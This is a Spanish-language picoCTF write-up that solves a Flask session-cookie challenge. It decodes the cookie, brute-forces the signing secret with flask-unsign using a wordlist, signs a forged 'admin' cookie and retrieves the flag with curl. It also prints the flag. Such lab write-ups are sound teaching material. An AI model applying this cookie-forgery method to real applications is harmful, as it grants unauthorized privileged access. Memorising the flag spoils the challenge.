## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)

¡Está bien, basta de usar mi propio cifrado! ¡Las cookies de sesión de Flask deberían ser lo suficientemente seguras!
## Solución
Al ingresar a a la página nos pide ingresar un nombre de una galleta, al hacerlo nos dice que esa galleta es buena pero no especial, al revisar las cookies del sitio encontramos una llamada `session` con el valor `eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-3OxA.BXs3vEpBfBsLhBHfArv5_nfMxcg`,  con el comando `echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-3FMw.hSa8RdlcBu_bFpINNzOBgPJz6Ms | base64 -d`la desciframos y nos dice lo siguiente `{"very_auth":"snickerdoodle"}base64: invalid input` por lo que debemos crear una cookie que mande el valor `"very_auth":"admin"`, para ello usaremos la herramienta `Flask-Unsign`.

Para instalarlo en Ubuntu se uso el siguiente comando `pip3 install flask-unsign[wordlist]` una vez instalado se uso una lista de la galletas aceptadas por el sitio haciendo uso del script `server.py`que se nos dio en la página PicoCTF:
```
sergio_so@DESKTOP-F40822T:~$ cat text.txt
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
```
Y con el siguiente comando se probaron las galletas `flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-3FMw.hSa8RdlcBu_bFpINNzOBgPJz6Ms" --wordlist text.txt`. El resultado fue el siguiente: 
```bash
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'gingersnap'
```
Ahora que conocemos la galleta correcta podemos construir la cookie admin, esto se logra con el siguiente comando `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "gingersnap"`, la cookie resultante la mandamos a la pagina con el siguiente comando junto a una expresión regular para solo ver la bandera: `curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session = eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-3OhQ.hFaVq5P7kwHQVU_RyztwnqwaIyQ" | grep -oE "picoCTF{.*?}"`

La bandera es: `picoCTF{pwn_4ll_th3_cook1E5_5f016958}`
## Referencias
https://chatgpt.com
https://github.com/Paradoxis/Flask-Unsign